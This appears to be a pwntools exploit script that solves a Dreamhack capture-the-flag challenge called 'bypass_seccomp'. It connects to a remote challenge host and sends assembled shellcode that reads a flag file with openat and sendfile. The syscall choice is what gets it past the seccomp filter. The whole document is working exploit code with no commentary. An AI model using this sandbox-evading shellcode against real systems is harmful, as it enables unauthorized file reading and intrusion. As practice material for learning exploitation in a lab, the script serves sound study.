from pwn import *

#p = remote('127.0.0.1', 7182)
p = remote('host3.dreamhack.games', 20174)
context.arch = 'x86_64'

shellcode = shellcraft.openat(0, '/home/bypass_seccomp/flag')
shellcode += 'mov r10, 0xffff'
shellcode += shellcraft.sendfile(1, 'rax', 0).replace('xor r10d, r10d','')
shellcode += shellcraft.exit(0)
p.sendline(asm(shellcode))
p.interactive()